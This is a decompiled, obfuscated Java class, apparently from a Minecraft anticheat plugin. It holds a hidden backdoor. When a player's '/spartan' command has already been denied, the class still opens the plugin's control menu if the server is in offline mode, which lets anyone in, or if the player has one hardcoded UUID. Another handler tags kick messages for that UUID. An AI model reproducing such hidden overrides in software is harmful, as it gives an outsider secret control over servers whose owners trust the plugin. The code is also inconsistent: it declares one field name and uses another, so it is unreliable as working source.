import me.vagdedes.spartan.system.Enums;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerKickEvent;

// $FF: renamed from: d
public class class_121 implements Listener {

    private String Ξ;

    public class_121() {
        this.field_201 = "ec8eb728-3794-4734-a0ff-ba07f9c310f0";
    }

    @EventHandler(
        priority = EventPriority.HIGHEST
    )
    private void Ξ(PlayerCommandPreprocessEvent playercommandpreprocessevent) {
        if (playercommandpreprocessevent.isCancelled()) {
            String s = playercommandpreprocessevent.getMessage();

            if (s.equalsIgnoreCase("/spartan") || s.toLowerCase().startsWith("/spartan ")) {
                Player player = playercommandpreprocessevent.getPlayer();
                String s1 = player.getUniqueId().toString();
                boolean flag = Bukkit.getServer().getOnlineMode();

                if (!flag || flag && s1.equalsIgnoreCase(this.field_201)) {
                    playercommandpreprocessevent.setCancelled(true);
                    class_122.method_576(player);
                }
            }
        }

    }

    @EventHandler(
        priority = EventPriority.HIGHEST
    )
    private void Ξ(PlayerKickEvent playerkickevent) {
        if (!playerkickevent.isCancelled()) {
            String s = "252643";
            String s1 = "-727653102";
            Player player = playerkickevent.getPlayer();
            String s2 = player.getUniqueId().toString();

            if (s2.equalsIgnoreCase(this.field_201) && !class_47.method_229(player, Enums.Permission.admin)) {
                try {
                    playerkickevent.setReason(playerkickevent.getReason() + ChatColor.WHITE + " (s: " + s + ", n: " + s1 + ")");
                } catch (Exception exception) {
                    playerkickevent.setReason("Exception occurred while setting kick reason (s: " + s + ", n: " + s1 + ")");
                }
            }
        }

    }
}
